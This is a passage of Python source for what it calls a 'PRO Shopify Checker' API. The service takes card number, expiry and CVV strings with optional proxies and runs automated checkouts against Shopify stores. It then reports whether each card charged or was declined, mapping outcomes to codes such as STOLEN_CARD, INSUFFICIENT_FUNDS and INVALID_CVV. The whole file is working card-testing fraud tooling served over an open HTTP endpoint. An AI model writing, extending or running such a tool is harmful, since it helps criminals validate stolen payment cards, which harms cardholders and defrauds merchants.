                "localizationExtension": {"fields": []},
                "nonNegotiableTerms": None,
                "optionalDuties": {"buyerRefusesDuties": False},
            },
            "attemptToken": self.attempt_token,
            "metafields": [],
            "analytics": {"requestUrl": self.checkout_url or f"{self.domain}/"},
        }
        if self.checkpoint_data:
            variables["input"]["checkpointData"] = self.checkpoint_data

        code, text = self._gql_post({
            "query": query, "variables": variables, "operationName": "SubmitForCompletion",
        })
        if code is None:
            return {"status": "failed", "reason": "network_error_submit"}

        if "CAPTCHA_REQUIRED" in text:
            return {"status": "rejected", "errors": ["CAPTCHA_REQUIRED"]}

        data = None
        try:
            data = json.loads(text)
        except Exception:
            return {"status": "failed", "reason": "invalid_json_submit"}

        submit = data.get("data", {}).get("submitForCompletion", {})
        if not submit:
            for e in data.get("errors", []):
                if e.get("code"):
                    return {"status": "rejected", "errors": [e["code"]]}
            return {"status": "failed", "reason": "empty_submit"}

        tn = submit.get("__typename", "")

        if tn in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
            rid = submit.get("receipt", {}).get("id")
            if not rid:
                return {"status": "failed", "reason": "no_receipt_id"}
            return self._poll_receipt(rid)

        if tn == "SubmitFailed":
            reason = submit.get("reason", "SUBMIT_FAILED")
            return {"status": "failed", "reason": reason}

        if tn == "SubmitRejected":
            for e in submit.get("errors", []):
                c = e.get("code", "")
                if c and c not in SOFT_ERRORS:
                    return {"status": "rejected", "errors": [c]}
            return {"status": "rejected", "errors": ["SUBMIT_REJECTED"]}

        if tn == "Throttled":
            return {"status": "failed", "reason": "throttled"}

        if tn == "CheckpointDenied":
            return {"status": "rejected", "errors": ["CHECKPOINT_DENIED"]}

        rid = submit.get("receipt", {}).get("id")
        if rid:
            return self._poll_receipt(rid)
        return {"status": "failed", "reason": "no_receipt"}

    # ---------- POLL ----------
    def _poll_receipt(self, rid):
        query = (
            "query PollForReceipt($receiptId:ID!,$sessionToken:String!){"
            "receipt(receiptId:$receiptId,sessionInput:{sessionToken:$sessionToken}){"
            "...on ProcessedReceipt{id orderIdentity{id __typename}__typename}"
            "...on ProcessingReceipt{id pollDelay __typename}"
            "...on WaitingReceipt{id pollDelay __typename}"
            "...on ActionRequiredReceipt{id action{...on CompletePaymentChallenge{offsiteRedirect url __typename}__typename}__typename}"
            "...on FailedReceipt{id processingError{...on PaymentFailed{code messageUntranslated __typename}__typename}__typename}"
            "__typename}}"
        )
        for _ in range(10):
            code, text = self._gql_post({
                "query": query,
                "variables": {"receiptId": rid, "sessionToken": self.session_token},
                "operationName": "PollForReceipt",
            })
            if code is None:
                time.sleep(3)
                continue
            try:
                data = json.loads(text)
            except Exception:
                time.sleep(3)
                continue
            receipt = data.get("data", {}).get("receipt", {})
            tn = receipt.get("__typename", "")

            if tn == "ProcessedReceipt":
                oid = receipt.get("orderIdentity", {}).get("id", "N/A")
                return {"status": "charged", "order_id": oid}

            if tn in ("ProcessingReceipt", "WaitingReceipt"):
                delay = receipt.get("pollDelay", 3)
                try:
                    delay = min(max(int(delay), 2), 8)
                except Exception:
                    delay = 3
                time.sleep(delay)
                continue

            if tn == "ActionRequiredReceipt":
                return {"status": "3ds_required", "data": data}

            if tn == "FailedReceipt":
                pe = receipt.get("processingError", {})
                return {"status": "declined",
                        "code": pe.get("code", "CARD_DECLINED"),
                        "message": pe.get("messageUntranslated", "")}
            time.sleep(3)

        return {"status": "failed", "reason": "poll_timeout"}

    # ---------- MAIN ----------
    def checkout(self, cc, mon, year, cvv):
        try:
            self.set_card_country(cc)

            if not self.visit_product_page():
                return {"status": "failed", "reason": "product_page_failed"}
            if not self.add_to_cart():
                return {"status": "failed", "reason": "cart_failed"}
            if not self.init_checkout():
                return {"status": "failed", "reason": "checkout_init_failed"}

            time.sleep(0.4)
            r1 = self.proposal_shipping()
            if r1["status"] != "ok":
                return r1

            time.sleep(0.4)
            self.proposal_delivery()

            time.sleep(0.4)
            return self.submit(cc, mon, year, cvv)
        except Exception as e:
            return {"status": "failed", "reason": f"checkout_exception: {str(e)[:60]}"}


# ============================================================
# CODE MAP
# ============================================================
CODE_MAP = {
    "PAYMENTS_UNACCEPTABLE": "PAYMENTS_UNACCEPTABLE",
    "PAYMENTS_UNACCEPTABLE_PAYMENT_AMOUNT": "PAYMENT_AMOUNT_INVALID",
    "PAYMENTS_UNACCEPTABLE_PAYMENT_METHOD": "PAYMENT_METHOD_REJECTED",
    "PAYMENTS_CREDIT_CARD_BASE_EXPIRED": "EXPIRED_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_CVV_FAILED": "INVALID_CVV",
    "PAYMENTS_CREDIT_CARD_BASE_INCORRECT_NUMBER": "INCORRECT_NUMBER",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_NUMBER": "INVALID_NUMBER",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_CVV": "INVALID_CVV",
    "PAYMENTS_CREDIT_CARD_BASE_INVALID_EXPIRY": "INVALID_EXPIRY",
    "PAYMENTS_CREDIT_CARD_BASE_DECLINED": "CARD_DECLINED",
    "PAYMENTS_CREDIT_CARD_BASE_GENERIC_DECLINE": "GENERIC_DECLINE",
    "PAYMENTS_CREDIT_CARD_BASE_INSUFFICIENT_FUNDS": "INSUFFICIENT_FUNDS",
    "PAYMENTS_CREDIT_CARD_BASE_CALL_ISSUER": "CALL_ISSUER",
    "PAYMENTS_CREDIT_CARD_BASE_DO_NOT_HONOR": "DO_NOT_HONOR",
    "PAYMENTS_CREDIT_CARD_BASE_PICKUP_CARD": "PICKUP_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_RESTRICTED_CARD": "RESTRICTED_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_SECURITY_VIOLATION": "SECURITY_VIOLATION",
    "PAYMENTS_CREDIT_CARD_BASE_SERVICE_NOT_ALLOWED": "SERVICE_NOT_ALLOWED",
    "PAYMENTS_CREDIT_CARD_BASE_STOLEN_CARD": "STOLEN_CARD",
    "PAYMENTS_CREDIT_CARD_BASE_TRANSACTION_NOT_ALLOWED": "TRANSACTION_NOT_ALLOWED",
    "PAYMENTS_CREDIT_CARD_BASE_TRY_AGAIN_LATER": "TRY_AGAIN_LATER",
    "PAYMENTS_CREDIT_CARD_BASE_PROCESSING_ERROR": "PROCESSING_ERROR",
    "PAYMENT_FAILED": "CARD_DECLINED",
    "GENERIC_ERROR": "GENERIC_DECLINE",
}


def map_code(raw):
    return CODE_MAP.get(raw, raw) if raw else "UNKNOWN"


# ============================================================
# PARSE
# ============================================================
def parse_result(r):
    if not r:
        return "UNKNOWN", False

    st = r.get("status", "")
    if st == "charged":
        return "ORDER_PLACED", True
    if st == "3ds_required":
        return "3DS_REQUIRED", False
    if st == "declined":
        code = map_code(r.get("code", "CARD_DECLINED"))
        return code, False
    if st == "rejected":
        errors = r.get("errors", [])
        if not errors:
            return "REJECTED", False
        mapped = [map_code(e) for e in errors if e]
        return ",".join(mapped) or "REJECTED", False
    if st == "failed":
        return extract_code(r.get("reason", "FAILED")), False
    return "UNKNOWN", False


# ============================================================
# RUN CHECK — bot.py compatible
# ============================================================
def run_check(site, cc, proxy=None):
    parts = cc.split("|")
    if len(parts) != 4:
        return {"Response": "INVALID_FORMAT", "Price": "-", "Gateway": "Unknown"}

    proxy_dict = None
    if proxy:
        proxy_dict, scheme = build_proxies_dict(proxy)
        if proxy_dict is None:
            if scheme == "no_socks":
                return {"Response": "NO_SOCKS_SUPPORT", "Price": "-", "Gateway": "Unknown"}
            return {"Response": "INVALID_PROXY", "Price": "-", "Gateway": "Unknown"}

    bot = None
    try:
        bot = Shopify(site, proxy_dict)
        r = bot.checkout(parts[0], parts[1], parts[2], parts[3])
    except Exception as e:
        return {"Response": f"EXCEPTION: {str(e)[:60]}", "Price": "-", "Gateway": "Unknown"}

    code, is_ok = parse_result(r)

    price = "0.00"
    if bot and bot.product:
        try:
            price = f"{bot.product['price']:.2f}"
        except Exception:
            pass

    gateway = "Shopify"
    if is_ok:
        gateway = "Shopify Payments"

    if is_ok:
        response_text = "ORDER_PLACED"
    elif code == "3DS_REQUIRED":
        response_text = "3DS_REQUIRED"
    else:
        response_text = code or "UNKNOWN"

    return {
        "Response": response_text,
        "Price": price,
        "Gateway": gateway,
        "code": code,
        "success": bool(is_ok),
        "site": site,
    }


# ============================================================
# HTTP HANDLER
# ============================================================
class Handler(BaseHTTPRequestHandler):
    protocol_version = "HTTP/1.1"

    def _send_json(self, status, payload):
        try:
            body = json.dumps(payload).encode("utf-8")
            self.send_response(status)
            self.send_header("Content-Type", "application/json")
            self.send_header("Content-Length", str(len(body)))
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Connection", "close")
            self.end_headers()
            self.wfile.write(body)
        except Exception:
            pass

    def log_message(self, fmt, *args):
        sys.stderr.write(f"[{BRAND.lower()}-api] " + (fmt % args) + "\n")

    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        qs = parse_qs(parsed.query, keep_blank_values=True)

        if path in ("/", "/health"):
            self._send_json(200, {
                "status": "ok",
                "service": f"{BRAND.lower()}-api",
                "version": VERSION,
                "socks_support": HAS_SOCKS,
                "endpoints": ["/Shopify", "/shopify", "/health"],
            })
            return

        if path.lower() in ("/shopify", "/shopify/"):
            site = (qs.get("site", [""])[0] or "").strip()
            cc = (qs.get("cc", [""])[0] or "").strip()
            proxy = (qs.get("proxy", [""])[0] or "").strip()

            if not site or not cc:
                self._send_json(400, {
                    "Response": "MISSING_PARAMS",
                    "Price": "-",
                    "Gateway": "Unknown",
                })
                return

            try:
                result = run_check(site, cc, proxy or None)
                self._send_json(200, result)
            except Exception as e:
                self._send_json(500, {
                    "Response": f"SERVER_ERROR: {str(e)[:80]}",
                    "Price": "-",
                    "Gateway": "Unknown",
                })
            return

        self._send_json(404, {"error": "not found"})

    def do_POST(self):
        self.do_GET()


# ============================================================
# MAIN
# ============================================================
def main():
    try:
        _init_db()
    except Exception:
        pass

    host = os.environ.get("JINX_HOST", "0.0.0.0")
    port = int(os.environ.get("JINX_PORT", "8080"))

    socks_status = "✅ available" if HAS_SOCKS else "❌ install PySocks"

    server = ThreadingHTTPServer((host, port), Handler)

    print()
    print("╔══════════════════════════════════════════════════════════╗")
    print(f"║  {BRAND} API — PRO Shopify Checker v{VERSION}                  ║")
    print("╚══════════════════════════════════════════════════════════╝")
    print(f"  Listening : http://{host}:{port}")
    print(f"  SOCKS     : {socks_status}")
    print(f"  Price     : ${PRICE_MIN} - ${PRICE_MAX} (mid-range)")
    print(f"  Workflow  : Proposal → Delivery → Submit → Poll")
    print()

    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print(f"\n  Shutting down {BRAND} API...")
        server.shutdown()


if __name__ == "__main__":
    main()
